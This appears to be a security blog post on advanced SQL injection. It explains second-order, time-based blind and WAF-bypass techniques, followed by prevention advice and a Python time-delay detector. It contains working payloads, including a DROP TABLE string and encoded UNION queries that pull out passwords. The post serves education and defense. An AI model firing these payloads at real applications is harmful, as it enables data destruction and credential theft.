SQL injection remains one of the most critical vulnerabilities in web applications, despite being well-known for decades. In this post, I'll explore advanced SQL injection techniques that work against modern web applications and frameworks.

## Modern Challenges

Today's web applications often implement various protection mechanisms:

- Web Application Firewalls (WAFs)
- Prepared statements and parameterized queries
- Input validation and sanitization
- Modern framework protections

However, vulnerabilities still exist, and attackers have developed sophisticated techniques to bypass these protections.

## Advanced Techniques

### 1. Second-Order SQL Injection

This technique involves injecting malicious SQL code that gets stored in the database and executed later when the data is retrieved and used in another SQL query.

```sql
-- Initial injection (stored in user profile)
'; DROP TABLE users; --

-- Later executed when profile data is used
SELECT * FROM posts WHERE author = ''; DROP TABLE users; --'
```

### 2. Blind SQL Injection with Time Delays

When error messages are suppressed, time-based attacks can be effective:

```sql
'; IF (SELECT COUNT(*) FROM users WHERE username='admin') = 1 WAITFOR DELAY '00:00:05'; --
```

### 3. WAF Bypass Techniques

Modern WAFs can often be bypassed using various encoding and obfuscation techniques:

```sql
-- URL encoding
%27%20UNION%20SELECT%20null%2C%20password%20FROM%20users%20--%20

-- Double encoding
%2527%2520UNION%2520SELECT%2520null%252C%2520password%2520FROM%2520users%2520--

-- Case variation
' uNiOn SeLeCt null, password FrOm users --
```

## Prevention Strategies

### 1. Parameterized Queries
Always use parameterized queries or prepared statements:

```python
# Secure approach
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# Vulnerable approach
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
```

### 2. Input Validation
Implement strict input validation:

```python
import re

def validate_user_input(user_input):
    # Allow only alphanumeric characters
    pattern = re.compile(r'^[a-zA-Z0-9]+$')
    return pattern.match(user_input) is not None
```

### 3. Least Privilege
Database users should have minimal necessary permissions:

```sql
-- Create restricted user
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON webapp_db.* TO 'webapp'@'localhost';
-- Do NOT grant DELETE, DROP, or administrative privileges
```

## Testing Tools

I've developed several tools for SQL injection testing:

### SQLi Detector
A Python script that automates SQL injection detection:

```python
import requests
import time

def test_time_based_sqli(url, param):
    payloads = [
        "'; WAITFOR DELAY '00:00:05'; --",
        "' OR SLEEP(5); --",
        "' || pg_sleep(5); --"
    ]
    
    for payload in payloads:
        start_time = time.time()
        response = requests.get(url, params={param: payload})
        response_time = time.time() - start_time
        
        if response_time > 5:
            return True, payload
    
    return False, None
```

## Real-World Examples

In my penetration testing engagements, I've discovered SQL injection vulnerabilities in:

1. **E-commerce Platforms**: Injection in product search functionality
2. **CMS Systems**: Vulnerabilities in admin panels
3. **Custom Applications**: Poor input validation in forms
4. **API Endpoints**: JSON-based SQL injection

## Conclusion

SQL injection continues to be a significant threat. While modern frameworks provide better protection, developers must remain vigilant and implement proper security measures. Regular security testing and code reviews are essential.
